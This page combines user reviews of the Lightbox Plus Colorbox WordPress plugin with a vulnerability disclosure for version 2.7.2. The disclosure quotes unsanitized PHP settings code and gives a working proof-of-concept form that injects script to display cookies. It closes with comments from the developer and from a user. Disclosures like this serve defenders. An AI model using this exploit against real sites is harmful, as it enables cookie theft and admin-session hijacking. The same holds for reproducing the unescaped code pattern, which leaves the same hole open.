Installed plugin, when to change some settings and bam!! site down. 500 error.
Tried disabling all plugins via SSH and also via MySQL and still 500 Error.
Have no idea what this thing did when I clicked save settings. Going to have to back up my DB and re-install from last week’s back up, and spend a much of time uploading files etc.
There are others with similar experience with this plug in, so I would highly recommend not to install this and try one of the other lightbox plugins instead.

Plugin is not responsive and thus unusable on mobile devices.
Support does not exist. I wrote on the support forum twice – author even did not bother to reply.

Considering that it’s a free plugin the featureset is great. However, even doing something as simple in the CSS as having the image float to the right of the text seems to prevent it from generating the popup. This makes it unusable for my site.

# Cross-Site Request Forgery (CSRF)/Cross-Site Scripting (XSS) Vulnerability in Lightbox Plus Colorbox

We recently discovered that the [Lightbox Plus Colorbox plugin](https://wordpress.org/plugins/lightbox-plus/) has a cross-site request forgery (CSRF)/cross-site scripting (XSS) vulnerability in version 2.7.2, and some prior versions, on the page/wp-admin/themes.php?page=lightboxplus.

No [nonce](https://codex.wordpress.org/WordPress_Nonces) is included on the page, leading to the CSRF issue.

For the XSS issue, in the file /lightboxplus.php starting at line 326 settings are saved and there is no sanitization done:

```
case 'settings':
$lightboxPlusOptions = array(
"lightboxplus_multi" => $_POST['lightboxplus_multi'],
"use_inline" => $_POST['use_inline'],
"inline_num" => $_POST['inline_num'],
"lightboxplus_style" => $_POST['lightboxplus_style'],
"use_custom_style" => $_POST['use_custom_style'],
"disable_css" => $_POST['disable_css'],
"hide_about" => $_POST['hide_about'],
"output_htmlv" => $_POST['output_htmlv'],
"data_name" => $_POST['data_name'],
...
```

When the values are outputted on the page through the file /admin/lightbox.admin.php they are not escaped. For example, the value for width is outputted line 504:

```
 <input type="text" size="15" name="width" id="width" value="<?php if ( !empty( $lightboxPlusOptions['width'] )) { echo $lightboxPlusOptions['width'];} else { echo ''; } ?>" />
```
## Proof of Concept

The following proof of concept will cause an alert box with any accessible cookies to be shown on the page. This will occur right after you hit the Submit button when using the Firefox web browser. Other major web browser have XSS filtering, so it will only be shown if you return to /wp-admin/themes.php?page=lightboxplus again after having submitted it.

Make sure to replace “[path to WordPress]” with the location of WordPress.

```
<html>
<head>
</head>
<body>
<form name="lightboxplus_settings" method="post" action="http://[path to WordPress]/wp-admin/admin.php?page=lightboxplus&amp;updated=settings">
<input type="hidden" name="action" value="action" />
<input type="hidden" name="sub" value="settings" />
<input type="hidden" name="width" value='"><script>alert(document.cookie);</script>' />
<input type="submit" value="Submit" />
</form>
</body>
</html>
```
## Timeline

* 3/29/2016 – Developer notified.
* 4/5/2016 – WordPress Plugin Directory notified.
* 4/5/2016 – Plugin removed from WordPress Plugin Directory.

   Hey Thanks – I totally didn’t see the email (or the other email). Will update the plugin as soon as possible (1-2 days with my current schedule)

   Thanks again,

   Because lightbox colorbox is so entrenched on what I am doing, what can I do to disable the admin area that causes this vulnerability in the code? Can I comment out the bad code in the lightboxplus.php? Can you give example of what to do?

   Looking for a short term solution to eliminate the vulnerability, even if it means I have to comment and uncomment the bad code to make changes in the admin. I don’t anticipate though ever having to change settings in Colorbox again.

   Any help here greatly appreciated!
